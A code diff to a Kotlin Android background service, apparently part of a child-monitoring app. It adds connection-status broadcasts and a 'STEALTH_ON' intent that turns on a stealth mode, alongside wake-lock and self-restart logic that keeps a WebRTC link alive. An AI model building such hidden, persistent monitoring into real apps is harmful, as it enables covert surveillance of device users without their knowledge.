@@ -73,6 +73,9 @@ class BackgroundService : Service() { // No binding, so return null in onBind
         private const val CHANNEL_ID = "DeltaApp_Background" // Notification channel ID
         private const val CHANNEL_NAME = "DeltaApp Background Service" // Channel name
         private const val CHANNEL_DESCRIPTION = "Keeps DeltaApp running in background" // Channel description
+        const val ACTION_CONNECTION_STATUS = "com.soumo.child.CONNECTION_STATUS"
+        const val EXTRA_STATUS = "status"
+        const val PERMISSION_CONNECTION_STATUS = "com.soumo.child.PERMISSION_CONNECTION_STATUS" // Custom permission
         // To start the service from other components
         @Volatile
         private var isServiceRunning = AtomicBoolean(false) // Track service state
@@ -215,6 +218,13 @@ class BackgroundService : Service() { // No binding, so return null in onBind
         // Reacquire wake lock on restart in case it was released
         acquireWakeLock() // Reacquire wake lock
 
+        // Handle service intent actions
+        val action = intent?.action // Get action from intent
+        if (action == "STEALTH_ON") { // Activate stealth mode
+            Log.d("BackgroundService", "Received STEALTH_ON via intent")
+            activateStealthModeService() // Activate stealth mode
+        }
+
         return START_STICKY // Restart service if killed by system
     }
     override fun onBind(intent: Intent?): IBinder? = null // No binding, return null
@@ -245,6 +255,17 @@ class BackgroundService : Service() { // No binding, so return null in onBind
         Log.d("BackgroundService", "Restart intent sent")
         // Alternative approach (less immediate):
         startService(restartIntent)
+    }
+
+    private fun sendStatusBroadcast(status: String) { // Broadcast connection status updates
+        try {
+            val intent = Intent(ACTION_CONNECTION_STATUS) // Create intent with action
+            intent.putExtra(EXTRA_STATUS, status) // Add status extra
+            sendBroadcast(intent, PERMISSION_CONNECTION_STATUS) // Send broadcast with permission
+            Log.d("BackgroundService", "Status broadcast sent: $status")
+        } catch (e: Exception) { // Handle errors
+            Log.e("BackgroundService", "Failed to send status broadcast: $status", e)
+        }
     }
 
     private fun createNotificationChannel() { // Create notification channel for foreground service
@@ -337,6 +358,7 @@ class BackgroundService : Service() { // No binding, so return null in onBind
                             reconnectionJob = null // Clear job reference
                             Log.d("BackgroundService", "Reconnection attempts reset after successful connection")
                             Log.d("BackgroundService", "Connection established")
+                            sendStatusBroadcast("Connected")
                         }
 
                         PeerConnection.PeerConnectionState.DISCONNECTED -> { // Disconnected
@@ -347,6 +369,7 @@ class BackgroundService : Service() { // No binding, so return null in onBind
                                 )
                                 serviceScope.launch { restartConnection() } // Restart connection
                             }
+                            sendStatusBroadcast("Disconnected")
                         }
 
                         PeerConnection.PeerConnectionState.FAILED -> { // Connection failed
@@ -357,6 +380,7 @@ class BackgroundService : Service() { // No binding, so return null in onBind
                                 )
                                 serviceScope.launch { restartConnection() } // Restart connection
                             }
+                            sendStatusBroadcast("Failed")
                         }
 
                         PeerConnection.PeerConnectionState.CLOSED -> { // Connection closed
@@ -367,6 +391,7 @@ class BackgroundService : Service() { // No binding, so return null in onBind
                                 )
                                 serviceScope.launch { restartConnection() } // Restart connection
                             }
+                            sendStatusBroadcast("Closed")
                         }
 
                         else -> {
